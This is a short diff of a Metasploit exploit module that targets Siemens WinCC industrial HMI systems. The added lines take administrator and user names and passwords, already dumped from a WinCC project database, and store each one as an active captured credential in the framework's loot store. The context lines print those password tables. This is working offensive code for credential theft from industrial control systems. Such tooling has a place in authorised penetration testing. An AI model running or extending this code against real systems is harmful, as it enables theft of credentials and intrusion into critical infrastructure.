@@ -155,6 +155,30 @@ class Metasploit3 < Msf::Exploit::Remote
 			print_table %w|ID NAME Password(hex) Password(text) GRPID|, prj[db]["users"], "WinCC users"
 			print_table %w|VARNAME VARTYP COMMENTS|, prj[db]["tags"], "WinCC tags"
 			print_table %w|CONNECTIONNAME PARAMETER|, prj[db]["plcs"], "WinCC PLCs"
+			
+			prj[db]["admins"].map do |usr|
+				report_auth_info(
+					:host => datastore['RHOST'],
+					:port => datastore['RPORT'],
+					:sname => 'HMI User',
+					:user => usr[0].strip,
+					:pass => usr[2],
+					:source_type => "captured",
+					:active => true
+				)
+			end
+			
+			prj[db]["users"].map do |usr|
+				report_auth_info(
+					:host => datastore['RHOST'],
+					:port => datastore['RPORT'],
+					:sname => 'HMI User',
+					:user => usr[1].strip,
+					:pass => usr[3],
+					:source_type => "captured",
+					:active => true
+				)
+			end
     	end
     end
 
